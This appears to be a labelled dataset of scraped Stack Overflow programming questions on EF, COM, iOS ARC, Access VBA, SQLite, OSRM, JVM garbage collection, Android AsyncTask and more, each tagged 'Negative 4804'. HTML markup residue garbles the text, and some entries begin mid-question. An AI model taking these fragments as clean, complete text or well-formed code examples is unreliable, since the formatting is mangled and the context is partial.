Or maybe there is a magic property on codeDbContextcode like codeKeepForeingKeysPropertiesSyncronizedWithReferencescode that does that to me and I am the only sad programmer that are woried about this Or am I paranoid also, sorry for my poor englishp  pstrongEDITstrong Sorry for that  this really was a stupid question. Stefan is right, EF really does this for you. I wasnt seen this because the references I was passing was loaded with codeAsNoTrackingcode. Only in this condition you will have a reference with ID and the foreing key field will be 0. As long as you pass a reference that is already on the context, it should work.p

Negative 4804 pI have created an App on facebook and I am using this app to authorize an user via dotnetopenauth.p  pHere I would pass APPID and APPSECRET and get the token which would be used to call Facebook Graph to get facebook user details.  If Im doing this for the first time, user would be asked to enter usernamepassowrd on the Facebook website and then the session is created in the browser and it will redirect to my website as a Facebook user. This means that if I open a new tab in the current window and open facebook, user will see hisher page directly without asking for usernamepassword.  this is obvious and understandable.p  precode  code  request  WebRequest.Createhttpsgraph.facebook.commeaccesstoken  Uri.EscapeDataStringstrAccessToken   response  request.GetResponse codepre  pMy query is After the scenario above, if user logs out from Facebook website OR I close the browser window, the facebook session is lost. However, I still have the access token string in the above code that I got while authenticating.  So, As of this moment I am not storing any user information from Facebook not even cookies or anything else. I am just requesting user to authorize my application as a Facebook user. When user does that, I get the access token which I can use it to make calls to Graph and REST APIs. This access token usually remains same, so I really dont need to pass the applicaition id and secret to get the token next time onwards. Actually I can request the graph APIs and REST APIs with the stored token and request user details. I have tested this and works fine.p  pWhat I am looking for is, if user opens www.facebook.com, user should see hisher personal facebook page which obviosuly is possible only if I have a session in the current browser. Hence, my question was how do I use my access token OR what call should I make with my access token so that I can set the browser session for the facebook user Is it possible technicallyp  pRegards, AGp

Negative 4804 pI am learning C as in, I am installing Visual Studio now, and Im holding Hortons book in my hand, and my reason for doing so is that I want to write a p2p type clientserver program that will allow users to stream video from a device without needing port forwarding and save loads of time on tech support calls.p  pI want the user to register the device with the home server through the device menu engineers will take care of that and then on a PC, log into a client and add the device to a proverbial friends list of devices using the password they used on the machine.

Negative 4804 pI work as part of a large team working on iOS legacy code with a target iOS environment of 4.3 and later. I have seen other developers check in classes that descend from codeNSObjectcode but do not have a codedealloccode method. I have also seen codeUIViewControllercode descendants that do not include codeviewDidUnloadcode methods. When I ask about this code the usual response is Dont worry, ARC takes care of that now.p  pI understand that codeviewDidUnloadcode is called when iOS experiences low memory conditions, with a goal of freeing up memory by releasing objects that can be recreated by calling codeviewDidLoadcode, and that codedealloccode is called when the retain count of an object hits zero. For UIViewController objects and descendants this can mean that viewDidUnload may or may not be called before codedealloccode.p  pSo heres my question Are codedealloccode and codeviewDidUnloadcode methods still required when using ARC on iOS versions prior to iOS 6p  pIf the answer is strongYesstrong then I will need good reasons andor documentation to carry the argument.p  pLooking forward to your responses. With thanks to Tommy for helping me tighten up my question.p

Negative 4804 pThis is a followon to a prior question I posted see a hrefhttpstackoverflow.comquestions12463113handlinganhtmlbuttonclickeventinccodeherea.  Im trying to call my nativeC code from Javascript running in an HTML page.  The answer in the referenced question was to create a COM object.  The Javascript can then create an instance of the COM object and invoke methods on it getting to the nativeC code.p  pSo now Im left with trying to create a simple COM object to accept the call from the Javascript.  It looks like the way to go is to create a DLL and put the COM object in that DLL.  Years ago I did tons of reading on COM and have tried to forget it since then   Now Im getting a headache wondering how to go about this easily without becoming an expert in COM.p  pIs there a simpleeasy way to setup a DLL with a COM object that you would recommendp  pEDIT My application is written using native CWin32MFC.  I have an MFC dialog which uses the IE ActiveX browser control to render locally generated HTML.  Currently the button handler code is all in Javascript, but as you can see from the referenced question, my goal is to handle it on the C side.p
Negative 4804 pGeneral idea is that do two for loop, carry out every character from string 1, compare to every character from string2, if all finded, that will indicate Include. so we need to loop all the char from string1, and compare all look all the character from string2, that will O sqaure runing time. Which interviewer says it is not good idea.p  pafter it, i am thinking for it. i cannot generate one idea that did not do two loop. perhaps i can first get all the character from string1, convert into asc2, the number built into a tree. so when do the compare to the string2, it will make search very fast.p  pOr any folk has better ideap  pLike string1 is abc but string2 is cbattt that means every character is included in string2. not substring,p

Negative 4804 pI am doing some maintenance work on a linkedtable application in Microsoft Access 2010 and experiencing this little gem of a problem.  The application is linked to a SQL Server 2008 database.  The application has a main form that allows a user to choose a combination of park code and resource and pops up an edit form for the details of that particular combination. If that combo doesnt exist in the database, the application inserts a new record in, but the issue is that 2 records get inserted.p  pHeres the seat of the problem code, it gets called when I need to insert a new record in a details popup formp  precodePrivate Sub NewRecunitcode As String, resource As String, sql As String     DoCmd.RunSQL INSERT INTO PARKRESOURCES unitcode, resource, sensitivity VALUES       amp  amp unitcode amp , amp resource amp ,public     Force an explicit save    httpwww.pcreview.co.ukforumsupdatecancelupdatewithoutaddneweditt1150554.html    If Me.Dirty Then       Me.Dirty  False    End If     Me.RecordSource  sql End Sub codepre  pCreating a new record results in 2 records getting inserted into the Recordset.  It doesnt seem to matter if I move the explicit save code before or after setting the RecordSource.  In either order and stopping after either produces 2 new records inserted in the database verified by querying in SSMS.  p  pWhen I set the RecordSource property and step through the code, the event chain looks like Me.RecordSource  sql  FormBeforeUpdate  FormAfterUpdate  FormAfterInsert  FormCurrent.  The duplicate is not present at the close of BeforeUpdate, but by the time I get to AfterUpdate, the duplicate has already been inserted.  What happens between BeforeUpdate and AfterUpdate that causes this to happen  p  pAccording to a hrefhttpmsdn.microsoft.comenuslibraryofficeff83539728voffice.1429.aspx relnofollowMSDN, the order isa BeforeInsert  BeforeUpdate  AfterUpdate  AfterInsert.  They also state that setting the value of a control through Visual Basic doesnt trigger these events.  But when I update the RecordSource in code, the last 3 events certainly fire BeforeInsert is the only one that a stepthrough doesnt stop on.p  pAs per Daniel Cooks request, here is the calling code. p  precodePrivate Sub FormLoad    On Error GoTo ErrFormLoad     Me.KeyPreview  True    If Not IsNullMe.OpenArgs Then       ProcessOpenArgs Me.OpenArgs       Me.lblHeader.Caption  Me.unitcode amp  Resource   amp Me.resource    Else       Me.lblHeader.Caption  Information Needs    End If    ... error trapping End Sub codepre  pAnd the ProcessOpenArgs sub OpenArgs get set as parkresourcep  precodePrivate Sub ProcessOpenArgsopenargs As String    On Error GoTo ErrProcessOpenArgs     Dim Args As String    Args  Splitopenargs,      Me.unitcode  Args0    Me.resource  Args1     Check to see if there are records in the database for current unitresource combo    Dim rs As DAO.Recordset    Dim sql As String    sql  SELECT  FROM PARKRESOURCES  amp      WHERE resource amp Me.resource amp  AND unitcode amp Me.unitcode amp     Set rs  CurrentDb.OpenRecordsetsql, dbOpenDynaset, dbSeeChanges     if there arent, create a new record    If rs.RecordCount  0 Then       NewRec Me.unitcode, Me.resource, sql    Else go to the current listing       Me.RecordSource  sql    End If  ExitProcessOpenArgs    Exit Sub ErrProcessOpenArgs    MsgBox Err.Number amp Err.description    Resume ExitProcessOpenArgs End Sub codepre  pI will continue to comb through the event documentation and as a last resort I may go totally nuts and just stick every possible event in my VBA code and step through them, but does anyone know what could be happening to cause the duplicatesp

Negative 4804 pI have made a SQLite database 700MB, 3 tables, 3 indexes  1 rtree index and 2 primary keys. I have marked it as a readonly file on Windows.p  pIs it safe and performant to execute just SELECT commands on this database from multiple threadsp  pIf so how can it be made more performant any options or flags to enable, any tiny tuningsp  pThis application is in C using System.Data.SQLite 1.0.82.0, compiled for .NET 4.0 on a x64 machine. And It works fine not necessarily performant or correctly paralleled because I can notdo not know how to prove them. Currently I have no real bottleneck but soon I will I need to search the rtree as fast as possible. On my machine 4GB, 2 Cores It takes sometimes more than 5 milliseconds to search the rtree. I have made that part multithreaded to process my data paralleled. And according to structure of the a hrefhttpen.wikipedia.orgwikiRtree relnofollowRTreea or I think RTree in SQLites case if my database grows to some GB it should be no problem because these trees has low depths and are fast on large datasets. But if any improvements are possible, then it should be considered in this application.p  pI can not be sure that the part that has been made parallel is really running in parallel and for example SQLite or System.Data.SQLite has not an internal lock. In fact in some tests the parallel version runs slowerp

Negative 4804 pIve been playing around with the a hrefhttpprojectosrm.org relnofollowOSRMa routing library recently. It seems to be highly efficient at solving the shortest path problem. However, I didnt see how to compute single source shortest paths with it. More precisely, given a fixed starting point, compute the shortest distances to all locations that can be reached within a given distance limit e.g., reachable within 30 minutes.p  pOSRM uses contraction hierarchies internally. From my understanding, this technique is way superior to Dijkstras algorithm when it comes to computing the distance between two locations in real world data. However, for my problem, Dijkstras algorithm seems to fit better, doesnt it p  pDoes OSRM provide an API to compute single source shortest path problems with a limit on the distance Are there other free routing libraries that are better suited for this type of problem Preferably one with good support for OpenStreetMap data.p

Negative 4804 pI am currently converting a matlab set of models that calculate the log likelihood using the optimizer codefminunccode to R using codeoptim BFGScode.p  pI have the initial values, the maximum likelihood values and end parameter results for all the matlab models. Most of the R converted models can find using optim, the same log likelihood and the same end parameter values using the same initial parameters as matlab. However some get stuck at a local optima which can be fixed by putting in the matlab end parameter values as the initial values, and these models then find the matlab maximum likelihood values. p  pIs there a more powerful optimization for R, that in on par with matlabs or is it just that R is more likely to get stuck at a local optima and therefore intial parameter values become more critical in them achieving the maximum log liklihood that getting stuck at local optim p  precoderesltoptimparx,fnBOTH4classnochange,hessianTRUE,methodBFGS,controllistmaxitMaxIter,abstolTolFun,reltolTolX codepre

Negative 4804 pWe have a master database which keeps global tables for all divisions. It also has a division table which contains database name and other connection parameters.p  pAll divisions have separate databases which contain division specific tables and also global tables which are copy of global tables from master database.p  pWe are looking to create a dynamic stored procedure which will run as a job each day and check if any global tables have been updated in master database. If yes, the data will be copied from global tables to division tables for each division in a loop.p  pAny help or pointers in developing this will be much appreciated. Thanksp

Negative 4804 pI am creating a codeDataGridViewCalendarCellcode based on a hrefhttpmsdn.microsoft.comenuslibrary7tas5c80.aspx relnofollowthis MSDN samplea and I want to override the Clone of the base class codeDataGridViewTextBoxCellcode because I have added two properties to codeDataGridViewCalendarCellcode. The problem is that Im not sure of how to go about this.p  h2Why I think I need to override Cloneh2  pThe codeDateTimePickercode has two properties codeCustomFormatcode and codeFormatcode that I want to expose on through properties on my codeCalendarColumncode Class that I can set when initializing the codeCalendarColumncode. These properties will then set the properties on the codeDataGridViewCalendarCellcode that the column uses as a template like sop  precodepublic string CustomFormat       get          return DataGridViewCalendarCellbase.CellTemplate.CustomFormat          set          DataGridViewCalendarCellbase.CellTemplate.CustomFormat  value        public DateTimePickerFormat Format      get          return DataGridViewCalendarCellbase.CellTemplate.Format          set          DataGridViewCalendarCellbase.CellTemplate.Format  value       codepre  pIn the codeDataGridViewCalendarCell.InitializeEditingControlcode function the properties are again passed on to the codeDateTimePickercode used to edit the cell value.p  pThe problem I have is that when codeDataGridViewCalendarCell.InitializeEditingControlcode is called the codeFormatcode and codeCustomFormatcode are not set anymore.p  pI am guessing this is because the actual codeDataGridViewCalendarCellcodes are clones of the template. As I didnt override the codeClonecode method of codeDateGridViewTextBoxCellcode, my extra properties are not cloned as well.p  pAlso, there is a nice note in the MSDN article p  blockquote   pWhen you derive from DataGridViewCell or DataGridViewColumn and add   new properties to the derived class, be sure to override the Clone   method to copy the new properties during cloning operations. You   should also call the base classs Clone method so that the properties   of the base class are copied to the new cell or column.p blockquote  h2Why I dont know how to override Cloneh2  pThis makes me feel like there is a standard way to do this for WinForms controls, but I cant find anything about it. p  pThere is no copy constructor on codeDataGridViewTextBoxCellcode to which I can pass the clone returned from codebase.Clonecode. I prefer not to use Reflection because Im not sure how to tell which properties I should and shouldnt copy. I wonder if I could do something with serialization, but I am afraid of any side effects that I cant oversee, right now. p  pIs there a standard way to override Clone on a custom controlp  pEDIT I editted the question title because the cloning is not relevant for all custom controls, just for codeDataGridViewCellcodesp

When I convert it, I need to be able to change it to 04. Thus there are spaces that delimit the file, AND spaces that are placeholders for leading zeros.p  pI need to write a shell script to make that conversion. I tried using the cut command because each character stays in the same exact place, so the 7th char is always a delimiting space and the 8th char is always the tens digit, or a space that should be a leading zero. However I soon discovered that it treats two spaces as one, which totally throws off the count Since sometimes I have  4 and sometimes I will have 14.p  pSo I need a way to read and convert this file, either using cut, or some other method awk that will allow me to do this.

Negative 4804 pSo, I composed a quick jQuery function to give an idea of what I am looking for specifically, if anyone can help me solve this issue. I read a few posts on getting one element to hide while another shows. I dont have much experience on jQuery, so I apologize in advance. What I did find was that you can have both call simultaneously, or you could use the second statement as a callback. Im really only looking for something that will toggle the displays of the two with a moderate fade. I have in mind that I dont want the triangles to move, it should be as if the text is just changing inside the triangle. But what I have here doesnt seem to be effective. I want to have the second triangle hidden on page load, but I cannot get it to, and I also cannot get the first triangle to hide on click. I am just seeking a quick fix for the issue.

Negative 4804 pA single swipe gesture is intended by Apple to move the VoiceOver cursor through screen items in order but mine dont because the user can move them aroundp  pMy main view has a set of buttons and labels, however it also has two collections of custom subviews, lets call the instances SVA1 to SVA9 amp SVB1 to SVB9 in ascending order from left to right. That is, SVA is one custom UIView class and SVB is the 2nd. When I drag, say, SVA3 to the current position of SVA6 then I end up with an order of SVA1, SVA2, SVA4, SVA5, SVA3, SVA6, SVA7, SVA8 amp SVA9. The collections are linked so that that same order would now also be mirrored in the SVB subview collection via my code.p  pMy problem is that swiping to the right, expecting VoiceOver to read out my items as I see them on screen results in a different order. It gets quite a lot of them right but then will suddenly move the VoiceOver cursor from the first collection to the 2nd or change its direction. After a move my code is aware of the new order of all the subviews but Id like to be able to get that information to VoiceOver.p  pEach custom subview is an accessibilityElement. Is there a way that I can tell VoiceOver to read back my items in the order Id expect Ive come across the accessibilityElementAtIndex method but dont see whether or how that fits with my situation.p  pThank you.p

Negative 4804 pI am very, very new to XcodeCocoaObjectiveC and have been teaching myself via reading through Apples documentation and also via reading through a series of books. I have been building sample applications based on the instructions in these books and have, I believe, come a long way in a short time. I understand how to create a new application project in Xcode, how to create a Data Model with various related Entities onetoone and onetomany relationships, create subclassed objects out of that Data Model, etc. I have created several custom attributes inside those subclassed objects and all is working well.p  pI am, nevertheless, running into a major problem. This issue is likely a combination of my lack of experience with core data, binding, and ObjectiveC in general and an inability to see the forest for the trees. I have been searching for a week here and other places on the web, have read and reread various bits of text, all to no avail.p  pHere is what I want to dop  pI am attempting to create an application to replace my fathers fuel mileage spreadsheet that he has used for years. Therefore, I have two Entities in my Data Model. One is Vehicle and contains vehicle information such as starting mileage, make, model, etc. The other is Log and contains fuel fillup information such as date, odometer, gallons, etc. I have everything wired up across two Table Views so that selecting a vehicle in the first table shows me log entries related only to that vehicle in the second table. I have custom attributes displayed in my second table for various bits of data such as Price Per Gallon derived from Total Cost and Gallons.p  pAll that works just fine. The problem is that I want to calculate a perrecord MPG one MPG per entry in the log table. So, what I need is the previous records odometer reading subtracted from the current records odometer reading. For example, if the current records odometer is 500 and the previous records odometer is 300, then the result would be 200 miles. I would then perform some simple math to end up with the MPG value for that record. However, while I can access the current record value in my custom attributes, I cant figure out how to access any other records values. To make matters worse, Im not entirely sure I am describing my problem correctly enough for others to understand what I want to do.p  pAdditionally, it should be noted that I am purposely simplifying the math required to properly calculate MPG. If I can understand how to correctly access data across multiple records, then I can work out the proper math later.p  pHere is an example of a custom attribute in the subclassed object for the Log Entityp  precode NSString pricePerGallon      if self.gallons.floatValue  0          return 0.000          NSNumber ppg  [NSNumber numberWithFloatself.totalCost.floatValue  self.gallons.floatValue]     NSString pricePerGallon  [NSString stringWithFormat.3f, ppg.floatValue]     return pricePerGallon    NSSet keyPathsForValuesAffectingPricePerGallon      return [NSSet setWithObjectskGallons, kTotalCost, nil]  codepre  pThanks in advance for any help that can be offered. Im not adverse to reading, but finding the right info to read has been very difficult. Plus, I find that I learn best with examples so, at worst, I can copy the examples into a new application to code, build, run, and test with.p

Negative 4804 pI created my multiproject Scala build with two project directories, both subdirectories of the repository root directory, due to the statement a hrefhttpsgithub.comtypesafehubsbteclipsewikiUsingsbteclipse relnofollowherea that If your parent projects are merely folders aggregating sub projects, then using skipParents  true will ease importing all your sub projects into Eclipse using the Import Wizard like described above by reducing the number of necessary runs.p  pHowever, Mercurial Eclipse cannot see changes to files outside the two projects e.g. codeprojectBuild.scalacode, even when I press F5 to refresh Eclipses view of the filesystem, and this causes me endless annoyances, especially when  as now  I am trying to partially revert some changes.p  pHow can I make Mercurial Eclipse see the changesp  pSwitch to git might be an acceptable answer  if EGit works better in this situation.p

Negative 4804 pIs it possible to pass a Stylesheet to a view from a controllerp  pI have a codemaster.layoutcode file. This master layout is used for every page on the site. On the site the user can change colors and properties of their user profile, so on the profile pages I need to pass in either a custom user stylesheet, or custom style rules.p  pThe only solution I have found is to include an codeifcode statement in the view and if the page is a profile page then check if codestylecode is defined, if so include it. But this approach seems clunky.p  pIs it possible to define the layout and pass in scripts or style rules from within the controller itselfp  pstrongEditstrongp  pThe style rules are stored in a database in columns such as codeprofile.backgroundcolorcode and codeprofile.headingcolorcode. The controller then constructs them into either a stylesheet, and caches it, or includes the styles directly within a codeltstylegtcode tag on the profile view.

Negative 4804 pI have two NxN matrices that I want to multiply together A and B. In NumPy, I usedp  precodeimport numpy as np C  np.dotA, B codepre  pHowever, I happen to know that for matrix B only row n and column n are nonzero this comes directly from the analytical formula that produced the matrix and is without a doubt always the case.p  pHoping to take advantage of this fact and reduce the number of multiplications needed to produce C, I replaced the above withp  precodeimport numpy as np for row in range0, N     for col in range0, N         if col  n             C[row, col]  A[row, n]B[n, col]    Just one scalar multiplication         else             C[row, col]  np.dotA[row], B[, n] codepre  pAnalytically, this should reduce the total complexity as follows In the general case not using any fancy tricks, just basic matrix multiplication C  AB, where A and B are both NxN, should be ON3. That is, all N rows must multiply all N columns, and each of these dot products contains N multiplications  ONNN  ON3.p  pExploiting the structure of B as Ive done above however should go as ON2  N2  O2N2  ON2. That is, All N rows must multiply all N columns, however, for all of these except those involving B[, n] only one scalar multiplication is required only one element of B[, m] is nonzero for m  n. When n  m, which will occur N times once for each row of A that must multiply column n of B, N scalar multiplications must occur.p  pHowever, the first block of code using np.dotA, B is substantially faster. Im aware via information like a hrefhttpstackoverflow.comquestions10442365whyismatrixmultiplicationfasterwithnumpythanwithctypesinpythonWhy is matrix multiplication faster with numpy than with ctypes in Pythona that the low level implementation details of np.dot are likely to blame for this. So my question is this How can I exploit the structure of matrix B to improve multiplication efficiency without sacrificing the implementation efficiency of NumPy, iwithout building my own low level matrix multiplication in cip  pThis method is part of a numerical optimization over many variables, hence, ON3 is intractable whereas ON2 will likely get the job done.p  pThank you for any help. Also, Im new to SO, so please pardon any newbie errors.p

After some digging, it appears it is getting the position of the desired element wrong. What is it about the content on the page that would throw off the math on the position I cant link to my page, unfortunately, without some work, so if possible Id like some possible suggestions before I do that.p  pHere is the JQ I am usingp  precodejQuerydocument.readyfunction      window.scrollfunction             Check the location of each desired element          .fadein.eachfunction i               var bottomofobject  this.position.top  this.outerHeight             var bottomofwindow  window.scrollTop  window.height               If the object is completely visible in the window, fade it it              if bottomofwindow gt bottomofobject                   this.delay90  i.animate                     opacity 1                 , 600                                codepre  pThank you for any helpp

Negative 4804 pIm kinda stuck here and Im looking for some ideas. I have a breadcrumb system which uses codebeforecode and codeaftercode tags for the arrows.p  pimg srchttpi.stack.imgur.comtdV5C.png altenter image description herep  pThe maximum width for all the breadcrumbs put together is code735pxcode as that is the size of the container element.p  pNow I need to restrict the length of each breadcrumb to stop them overflowing and to ensure that they all stay on one line. To do this, I will need to set a maximum width on the breadcrumb. However the codemaxwidthcode will depend on the number of breadcrumbs which are currently visible.p  pI know that the easiest way would be to count the number of breadcrumbs present and set a fixed position by dividing the container width by the number of breadcrumbs, but this is strongemnotemstrong what I want  It would mean that breadcrumbs with a shorter title have a large gap, like below. img srchttpi.stack.imgur.comkyaTY.png altenter image description here p  pSo I need to specify a codemaxwidthcode, but the codemaxwidthcode will depend on the width of the other breadcrumbs.p  pFor example, if all the breadcrumbs have a fairly long title, the codemaxwidthcode will need to be small enough to allow all breadcrumbs to fit in the container.p  pBut if, say, five of the breadcrumbs have very short titles ie 4 characters and the fifth one has a longer title, I would want the codemaxwidthcode to allow all the text on the last breadcrumb to be displayed, but still ensuring that the breadcrumbs still fit inside the container.p  pSorry if this is too confusing. Heres a jsFiddle of my breadcrumbs so you can understand how theyre structured. If you need any more information please let me know.p  pa hrefhttpjsfiddle.net5CLYt relnofollowhttpjsfiddle.net5CLYtap  pThe second example in the jsFiddle shows how the codemaxwidthcode needs to be dependant on the width of the other breadcrumbs, and not just the number of the breadcrumbs displayed.p

Negative 4804 h2Questionh2  pstrongHow can you extend a python propertystrong p  pA subclass can extend a super classs function by calling it in the overloaded version, and then operating on the result.

I need to keep the attributes access lazy. I dont want the user to have to invoke a special routine to make the calculations. basically, I dont want the user to never know the calculations were made in the first place. However, the attribute must remain a property, since ive got legacy code I need to support.p  pMaybe this is a job for decorators If Im not mistaken, decorator is a function that wraps another function, and Im looking to wrap a property with some more calculations, and then present it as a property again, which seems like a similar idea... but I cant quite figure it out.p  h2My Specific Problemh2  pIve got a base class strongLogFilestrong with an expensivetoconstruct attribute strong.dataframestrong. Ive implemented it as a property with the property decorator, so it wont actually parse the log file until I ask for the dataframe. So far, it works great. I can construct a bunch 100 LogFile objects, and use cheaper methods to filter and select only the important ones to parse. And whenever Im using the same LogFile over and over, i only have to parse it the first time I access the dataframe.p  pNow I need to write a LogFile subclass, strongSensorLogstrong, that adds some extra columns to the base classs dataframe attribute, but I cant quite figure out the syntax to call the super classs dataframe construction routines without knowing anything about their internal workings, then operate on the resulting dataframe, and emthenem cachereturn it.p  precode Base Class  rules for parsinginteracting with data. class LogFileobject     def initself, filename          file name to find the log file         self.filename  filename          nonpublic variable to cache results of parse         self.dataframe  None      def parseself         with openself.filename as infile             ...             ...

Negative 4804 pI have a Java app which shows different GC behaviour in different environments. In one environment, the heap usage graph is a slow sawtooth with major GCs every 10 hours or so, only when the heap is 90 full. In another environment, the JVM does major GCs every hour on the dot the heap is normally between 10 and 30 at these times.p  pMy question is, what are the factors which cause the JVM to decide to do a major GCp  pObviously it collects when the heap is nearly full, but there is some other cause at play which I am guessing is related to an hourly scheduled task within my app although there is no spike in memory usage at this time.p  pI assume GC behaviour depends heavily on the JVM I am usingp  ul liJava HotSpotTM 64Bit Server VM 1.7.021 Oracle Corporationli liNo specific GC options, so using the default settings for 64bit server PS MarkSweep and PS Scavengeli ul  pOther infop  ul liThis is a web app running in Tomcat 6.li liPerm gen hovers around 10 in both environments.li liThe environment with the sawtooth behaviour has 7Gb max heap, the other has 14Gb.li ul  pPlease, no guesswork.

Negative 4804 pI need a customized keyboard. Only certain certain letters should be in the keyboard. I guess this is quite easy.

I would be like 7080 of all the space would be taken by the letter A and maybe at the bottom, right aligned there would be a little number.p  pI guess this is not possible to do by using and customizing the default keyboard right What would you suggest Thanks.p

Negative 4804 pI have a simple xaml form which, when LoadState is called, enables a Dispatch Timer. When the dispatch timer fires, it checks a service for new items. If a new item meets a certain criteria, it adds the message to a local variable which ends up being bound to a listview, and we use the ToastNotification framework to create a new toast. However, one thing Ive noticed is that the ToastNotifications appear only to work when the app is focused which, of course, defeats the point. I think this makes sense, in part, because my app is suspended when not focused.p  pHowever, I know my DispatchTimer is executed when the app is suspended, because I see the web requests firing off to the service. It must mean that my call to send the notification is deferred somehow.  I guess conceptually, how do I get the toast notifications to execute if my app is suspended I have read up on BackgroundTasks, but those only respond to system events. What I really want is for my app to poll for messages regardless of its suspended state, update the UI when it can and update notifications whether the app is supended or not.p

Negative 4804 pWhat are the differences, side effects, andor preferences of these 2 different ways of adding an event handler for the codeSQLConnection.StateChangecode event  Since codeAddressOfcode creates a delegate a hrefhttpmsdn.microsoft.comenuslibraryy72ewk2b.aspx relnofollowhttpmsdn.microsoft.comenuslibraryy72ewk2b.aspxa, and codeStateChangeEventHandlercode is a delegate as well, example 2 seems to just be creating nested delegates, but Im guessing that there is some nuance that Im missing.p  pFrom my testing they appear to work the same using either example 1 or 2.  Neither throw an exception when attempting to call AddHandler more than once my first assumption was that calling example 1 would throw an error if attempting to call AddHandler a second time since it would be adding the same reference, as where example 2 would not since it would be a new delegate instance however, they both succeed without an exception.p  pstrongExample 1strong Using only codeAddressOfcode a hrefhttpmsdn.microsoft.comenuslibrary7taxzxka.aspx relnofollowhttpmsdn.microsoft.comenuslibrary7taxzxka.aspxap  precodeAddHandler conn.StateChange, AddressOf OnConnectionStateChange codepre  pstrongExample 2strong Using an instance of the codeStateChangeEventHandlercode delegate as listed here a hrefhttpmsdn.microsoft.comenuslibrarya0hee08w28vvs.11029.aspxcssavelang1ampcslangvbcodesnippet2 relnofollowhttpmsdn.microsoft.comenuslibrarya0hee08wvvs.110.aspxcssavelang1ampcslangvbcodesnippet2ap  precodeAddHandler conn.StateChange, New StateChangeEventHandlerAddressOf OnConnectionStateChange codepre  pAlso, is there a need to remove this handler prior to disposeend of the codeusingcode block via codeRemoveHandlercode, or will codeSQLConnection.Disposecode take care of that for you  Im not sure how you would remove the event handler if using the codeStateChangeEventHandlercode in example 2 below from the MSDN site, since the instance of codeStateChangeEventHandlercode delegate is not stored in a local variable, so you have no reference of the handler to remove you would have to do something similar to Example 4.p  pstrongExample 3strong codeRemoveHandlercode using just codeAddressOfcodep  precode    Using conn As SqlConnection  New SqlConnection...

Negative 4804 pIm having a weird problem. Im using Subclasses of DialogViewController for a multipage interview. Each page presents a number of fields that can be edited, and hitting save in the upper right pushes the next page onto the NavigationController. It seemed to be working fine, but it became apparent that backing out and repeating the interview leaks memory. I created a simple test case that properly cleans up the button event for the navigation item. In this example, Dispose is called when the second controller is popped, but only if I dont set Root to something other than null i.e. this works as expected if I comment the Root  ... line. Heres the code. Please tell me Im missing something stupid.p  precodepublic class TestViewController  DialogViewController  int mPage  public TestViewController int page  base null, true      mPage  page      Root  new RootElement Testing          new Section               new StringElement Page   mPage                 public override void ViewDidLoad       base.ViewDidLoad       NavigationItem.RightBarButtonItem  new UIBarButtonItem UIBarButtonSystemItem.Play   public override void ViewWillAppear bool animated      base.ViewWillAppear animated      NavigationItem.RightBarButtonItem.Clicked  OnClicked   public override void ViewDidDisappear bool animated      base.ViewDidDisappear animated      NavigationItem.RightBarButtonItem.Clicked  OnClicked   private void OnClickedobject sender, EventArgs e      NavigationController.PushViewControllernew TestViewControllermPage  1, true   protected override void Dispose bool disposing      base.Dispose disposing   codepre

Any ideas whats causing this Logcatp  precode0729 142330.253 EAndroidRuntime16810 FATAL EXCEPTION AsyncTask 1 0729 142330.253 EAndroidRuntime16810 Process com.example.maptest, PID 16810 0729 142330.253 EAndroidRuntime16810 java.lang.RuntimeException An error     occured while executing doInBackground 0729 142330.253 EAndroidRuntime16810    at android.os.AsyncTask3.doneAsyncTask.java300 0729 142330.253 EAndroidRuntime16810    at java.util.concurrent.FutureTask.finishCompletionFutureTask.java355 0729 142330.253 EAndroidRuntime16810    at java.util.concurrent.FutureTask.setExceptionFutureTask.java222 0729 142330.253 EAndroidRuntime16810    at java.util.concurrent.FutureTask.runFutureTask.java242 0729 142330.253 EAndroidRuntime16810    at android.os.AsyncTaskSerialExecutor1.runAsyncTask.java231 0729 142330.253 EAndroidRuntime16810    at java.util.concurrent.ThreadPoolExecutor.runWorkerThreadPoolExecutor.java1112 0729 142330.253 EAndroidRuntime16810    at java.util.concurrent.ThreadPoolExecutorWorker.runThreadPoolExecutor.java587 0729 142330.253 EAndroidRuntime16810    at java.lang.Thread.runThread.java841 0729 142330.253 EAndroidRuntime16810 Caused by java.lang.NullPointerException 0729 142330.253 EAndroidRuntime16810    at com.example.maptest.RegisterDialog11SendSaveRequest.sendMessageRegisterDialog.java124 0729 142330.253 EAndroidRuntime16810    at com.example.maptest.RegisterDialog11SendSaveRequest.doInBackgroundRegisterDialog.java142 0729 142330.253 EAndroidRuntime16810    at  com.example.maptest.RegisterDialog11SendSaveRequest.doInBackgroundRegisterDialog.java1 0729 142330.253 EAndroidRuntime16810    at android.os.AsyncTask2.callAsyncTask.java288 0729 142330.253 EAndroidRuntime16810    at java.util.concurrent.FutureTask.runFutureTask.java237 0729 142330.253 EAndroidRuntime16810    ... 4 more codepre  pMy codep  precodesaveCircles.setOnClickListenernew View.OnClickListener           Override         public void onClickView v               class SendSaveRequest extends AsyncTaskltString, Void, Stringgt                    private Gson gson  new GsonBuilder.create                  String data  gson.toJsonmessage                  private String sendMessageString message, String address                      String url  http192.168.87.1088080MSS                              address                      HttpPost post  new HttpPosturl                      ListltNameValuePairgt nameValuePairs  new ArrayListltNameValuePairgt                             1                     nameValuePairs.addnew BasicNameValuePairreport,                             message                      try                          post.setEntitynew UrlEncodedFormEntity                                 nameValuePairs                      catch UnsupportedEncodingException e                                            Log.iclient, Your url encoding is shiat fail                                           HttpClient client  new DefaultHttpClient                     HttpResponse response  null                     try                          Log.iclient, Trying to execute                         response  client.executepost                         Log.iclient, Execution success                                                 catch ClientProtocolException e                          Log.iclient, Problems with execute post, ClientProtocolException                         e.printStackTrace                      catch IOException e                          Log.iclient, Problems with execute post, IOException                         e.printStackTrace                                           HttpEntity entity  response.getEntity                      String responseText                       try                          responseText  EntityUtils.toStringentity                      catch ParseException e                           TODO Autogenerated catch block                         e.printStackTrace                      catch IOException e                           TODO Autogenerated catch block                         e.printStackTrace                                          return responseText                                    Override                 protected String doInBackgroundString... params                      return sendMessageparams[0], params[1]                                   Override                 protected void onPostExecuteString result                      Toast.makeTextmainActivityContext, result,                             Toast.LENGTHLONG.show                                             String msg  gson.toJsonmainActivityContext                     .generateSavePayload                             mainActivityContext.circlesToArea,                             mainActivityContext.userId,                             mainActivityContext.userPassword              new SendSaveRequest.executemsg, save               codepre

